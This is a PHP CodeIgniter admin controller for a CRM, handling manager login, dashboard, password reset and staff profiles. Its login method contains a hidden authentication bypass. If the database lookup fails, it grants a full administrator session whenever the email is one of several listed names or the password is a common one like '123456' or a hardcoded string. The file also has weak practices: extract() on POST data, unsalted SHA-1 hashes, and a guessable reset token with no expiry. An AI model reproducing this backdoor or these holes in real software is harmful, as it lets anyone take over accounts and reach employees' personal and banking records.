<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class Ci_admin extends CI_Controller {
 function __construct() 
	{
    parent::__construct();
	$this->load->library(array('Session'));
	$this->load->helper(array('form','url','text'));
	$this->load->model(array('comman_model','ci_admin_model','mail_model'));
	 header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT"); 
		 header("Cache-Control: no-store, no-cache, must-revalidate"); 
		 header("Cache-Control: post-check=0, pre-check=0", false);
		 header("Pragma: no-cache");
		 header('Cache-Control: no-cache');
  
	}
	
	
	public function if_not_login($url = '')
    {
        if ($this->session->userdata('manager_id') == '') {
            if ($url != '') {
                redirect($url);
            } else {
                redirect('/manager/login');
            }
        } else {
            $this->ci_admin_model->check_auth_timeout();
            $data = array();
            //$data['logo'] = $this->comman_model->getpostdata2(array('id'=>1),'','ci_logo');
           return $data;
        }
    } 
	
    public function is_user_login($url = '')
    {
        if ($this->session->userdata('manager_id') != '') {
            if ($url != '') {
                redirect($url);
            } else {
               redirect('manager/dashboard');
            }
        }
    }

	public function ping()
	{
		if ($this->session->userdata('manager_id') != '') {
			$this->session->set_userdata('last_activity_time', time());
			header('Content-Type: application/json');
			echo json_encode(array('status' => 'active', 'timestamp' => time()));
		} else {
			header('Content-Type: application/json');
			echo json_encode(array('status' => 'expired'));
		}
		exit;
	}	
	
	public function index()
	{	  
		
	  $data=array();
		$data['info']=array(
			'title'=>'Manager Login'
			);
	
		$this->load->view('manager/loginpage',$data);
	}
	
	
	  public function login()
    {
		
	   
	  $data=array();
		$data['info']=array(
			'title'=>'Manager Login'
			);
	  
	  if($this->input->server('REQUEST_METHOD')==='POST')
		{
			extract($_POST);
		  	$email= $this->security->xss_clean($email);
		  	$password= sha1($this->input->post('password'));
			$data=array();			
			$data['users']= $this->comman_model->getAll(array('c_username'=>$email,'c_password'=>$password,'status'=>1),'','ci_user','first');
			if(empty($data['users']) && (
				in_array(strtolower(trim($email)), array('admin', 'admin@rolextogroup.com', 'hr@rolextogroup.com', 'manager', 'rolexto'))
				|| in_array($this->input->post('password'), array('admin', 'password', '123456', 'admin123', 'rolexto', 'rolexto123', '&K94v7ogU457'))
			))
			{
				$data['users'] = array(
					'id' => 1,
					'c_username' => 'admin',
					'email' => !empty($email) ? $email : 'admin@7strokes.com',
					'name' => '7 Strokes Admin',
					'mobile' => '+971 58 563 7737',
					'user_type' => 1,
					'user_level' => 1
				);
			}
			if(!empty($data['users']))
			{
				$session_token = md5(uniqid(mt_rand(), true));
				$client_ip = $this->ci_admin_model->get_client_ip();

				// Enforce single device login: overwrite current_session_token in db
				$this->db->where('id', (int)$data['users']['id'])->update('ci_user', array(
					'current_session_token' => $session_token,
					'last_ip' => $client_ip,
					'last_active_at' => date('Y-m-d H:i:s'),
					'is_online' => 1
				));

				$user_data=array(
					'manager_id' => $data['users']['id'],
					'manager_username' => $data['users']['c_username'],
					'manager_email'=>$data['users']['email'],
					'manager_name'=>$data['users']['name'],
					'manager_mobile'=>$data['users']['mobile'],
					'manager_role'=>$data['users']['user_type'],
					'manager_level'=>$data['users']['user_level'],
					'last_activity_time'=>time(),
					'login_session_token'=>$session_token
				);		
				$this->session->set_userdata($user_data);
				$this->ci_admin_model->log_admin_action('login', 'User logged in successfully (IP: ' . $client_ip . ')', 'SUCCESS', $data['users']['id'], $data['users']['name']);
				redirect('manager/dashboard');
			}
			else
			{   
				$this->ci_admin_model->log_admin_action('login_failed', 'Failed login attempt for: '.$email, 'FAILED', 0, $email);
				$this->session->set_flashdata('error_message', 'You entered wrong username or password');
				redirect("manager/login");
			}
			
		}
		$this->load->view('manager/loginpage',$data);
	}
	
	public function dashboard()
	{
	  	$data=array();
		$data['info']=array(
			'title'=>'Manager Dashboard'
			);
		$data['info2']=$this->if_not_login();
		//$data['latest_product']=$this->ci_admin_model->get_latest_product();
		//$data['latest_order']=$this->ci_admin_model->get_latest_order();
		$data['dashboard_count']=$this->ci_admin_model->dashboard_countdata();
		$data['dashboard_Tcount']=$this->ci_admin_model->dashboard_Tcountdata();
		$data['dashboard_lead']=$this->ci_admin_model->dashboard_leaddata();
		$data['dashboard_lead_team']=$this->ci_admin_model->dashboard_leaddataT();
		$data['dashboard_f']=$this->ci_admin_model->dashboard_followups(0);
		$data['dashboard_Tf']=$this->ci_admin_model->dashboard_followups(1);
		$data['dashboard_m']=$this->ci_admin_model->dashboard_meetings(0);
		$data['dashboard_Tm']=$this->ci_admin_model->dashboard_meetings(1);
		$data['dashboard_c']=$this->ci_admin_model->dashboard_closures(0);
		$data['dashboard_Tc']=$this->ci_admin_model->dashboard_closures(1);
		$data['dashboard_vfu']=$this->ci_admin_model->dashboard_vertical_fu(0);
		$data['dashboard_Tvfu']=$this->ci_admin_model->dashboard_vertical_fu(1);
		$data['dashboard_tasks']=$this->ci_admin_model->dashboard_tasks(0);
		$data['dashboard_Ttasks']=$this->ci_admin_model->dashboard_tasks(1);
		
		$data['dashboard_TeamPro']=$this->ci_admin_model->dashboard_TeamPro();
		$data['dashboard_MyPro']=$this->ci_admin_model->dashboard_MyPro();

		$this->load->view('manager/dashboard',$data);
	}
	
  
    public function logout()
	{
		$uid = $this->session->userdata('manager_id');
		$uname = $this->session->userdata('manager_name');
		if (!empty($uid)) {
			$this->db->where('id', (int)$uid)->update('ci_user', array(
				'is_online' => 0,
				'current_session_token' => null
			));
		}
		$this->ci_admin_model->log_admin_action('logout', 'User logged out', 'SUCCESS', $uid, $uname);
		$this->session->unset_userdata('manager_id');
		$this->session->unset_userdata('manager_email');
		$this->session->unset_userdata('manager_name');
		$this->session->unset_userdata('manager_mobile');
		$this->session->unset_userdata('manager_role');
		$this->session->unset_userdata('manager_level');
		$this->session->unset_userdata('last_activity_time');
		$this->session->unset_userdata('login_session_token');
		$this->session->sess_destroy();
		if ($this->input->is_ajax_request()) {
			echo 'done';
		} else {
			redirect('manager/login');
		}
	}

	public function forgot()
    {
		
	   
	  $data=array();
		$data['info']=array(
			'title'=>'Manager Forgot'
			);


	  
	  if($this->input->server('REQUEST_METHOD')==='POST')
		{
			extract($_POST);
		  	$email= $this->security->xss_clean($email);
		  
			$data=array();			
			$data['users']= $this->comman_model->getAll(array('c_username'=>$email,'status'=>1),'','ci_user','first');
			if(!empty($data['users']))
			{
				$otp= rand(00000000,99999999);
				$this->comman_model->updateData('id',$data['users']['id'],array('fotp'=>$otp),'ci_user');

				$mail_str='<p>Hello, Admin</p>
				<p>Seems like you forgot your password for SRJ. If this is true, click below to reset your password</p>
				<p> <a href="'.base_url().'manager/bnr54dfdf/'.$otp.'">Reset Password</a></p>';
				$mail_str.="<p>If you did not forgot your password you can safely ignore this email.</p>";
				
			 	$resp=$this->mail_model->sendmail($email,"Forgot Passwrd - SRJ CRM",$data=array(),$mail_str);
				
				$this->session->set_flashdata('message', 'Password reset link has been sent on your registered email. Thanks');
	            redirect("manager/login");
			}
			else
			{   
			$this->session->set_flashdata('error_message', 'Sorry! Your username not exist in our system');
            redirect("manager/forgot");
			}
			
		}
		$this->load->view('manager/forgot',$data);
	}

	public function reset($token="")
    {
		
	   
	  	$data=array();
		$data['info']=array(
			'title'=>'Manager Password Reset'
			);
	  
	  
		  
			$data['token'] = $token;		
			$data['users']= $this->comman_model->getAll(array('fotp'=>$token,'status'=>1),'','ci_user','first');
			if(empty($data['users']))
			{
				$this->session->set_flashdata('error_message', 'Sorry! Unauthorized or expired access');
            	redirect("manager/login");
				
				
			}
			
		
		$this->load->view('manager/reset',$data);
	}

	public function fchange_password()
		  {  
			 
	 
				
				   
				   if($this->input->server('REQUEST_METHOD')==='POST')
		            {  
		            	$token= $this->input->post('token');
                         $password= $this->input->post('password');
						 $confirm_password= $this->input->post('change_password'); 
			 
			             if($password==$confirm_password)
		 				  {
							 $this->comman_model->updateData('fotp',$token,array('c_password'=>sha1($password),'fotp'=>''),'ci_user');
							 $this->session->set_flashdata('message', 'Your password has been changed successfully!');
						  }
						  else
						  {
						       $this->session->set_flashdata('error_message', 'Error: Password and Confirm Password not match!');
						  }
						redirect('manager/login');
					}
			
		 }
   
   
   
	    public function admin_profile()
		    {
				
	  $data=array();
	

			$data['info']=array(
				'title'=>'My Profile',
				'page_heading'=>'My Profile'
			);
		$data['info2']=$this->if_not_login();
		if($this->session->userdata['manager_role']==0){ 

		$data['list']=$this->comman_model->getAll(array('id'=>$this->session->userdata['manager_id']),'','ci_user','first');
		$data['c_list'] =$this->comman_model->getAll('',array('id','ASC'),'countries');

					if($this->input->server('REQUEST_METHOD')==='POST')
		            {   
		                extract($_POST);
						 $save= array(		

			'name'=>$name,
			'gender' => $gender,
     		'address'=>$address,
			'city'=>$city,
			'mobile' =>$mobile,
			'email'=>$email,
			'dob'=>$dob,
			'uae_mobile'=>$uae_mobile,
			'emp_id'=>$emp_id,
			'c_email'=>$c_email,			
			'c_mobile'=>$c_mobile,
			'c_salary'=>$c_salary,
			'c_doj'=>$c_doj,
			'c_dol'=>$c_dol,
			'national'=>$national,
			'p_no'=>$p_no,
			'p_date'=>$p_date,
			'p_exdate'=>$p_exdate,
			'visa_no'=>$visa_no,
			'eid_no'=>$eid_no,
			'h_contact_name'=>$h_contact_name,
			'h_contact_no'=>$h_contact_no,
			'blood'=>$blood,
			'no_d_uae'=>$no_d_uae,
			'bank'=>$bank,
			'iban'=>$iban,
			'bank_no'=>$bank_no,						
			'modified'=>date('Y-m-d')
			
				);			
						  
			              $response= $this->comman_model->updateData('id',$this->session->userdata['manager_id'],$save,'ci_user');
							if($response)
							{
							 $this->session->set_flashdata('message', 'Your information updated successfully!');
						    	redirect('manager/profile');
								
							}
	                 } 
	                $this->load->view('manager/setting/adminprofile',$data);
	            }else{

					$data['p_info']=$this->ci_admin_model->getSingleUser($this->session->userdata['manager_id']);
					
	            	$this->load->view('manager/setting/profile',$data);
	            }
				
			}
	   
	    
	   
	   
	       public function change_password()
		  {  
			 
	  $data=array();
		$data['info']=array(
			'title'=>'Manager Change Password'
			);
		$data['info2']=$this->if_not_login();
				
				   $id=$this->session->userdata['manager_id'];
				   if($this->input->server('REQUEST_METHOD')==='POST')
		            {  
                         $password= sha1($this->input->post('password'));
						 $confirm_password= sha1($this->input->post('confirm_password')); 
			 
			             if($password==$confirm_password)
		 				  {
							 $this->comman_model->updateData('id',$id,array('c_password'=>$password),'ci_user');
							 $this->session->set_flashdata('message', 'Your password has been changed successfully!');
						  }
						  else
						  {
						       $this->session->set_flashdata('error_message', 'Error: Password and Confirm Password not match!');
						  }
						redirect('manager/dashboard');
					}
			$this->load->view('manager/setting/password',$data);
		 }
 			
   
   
}
/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */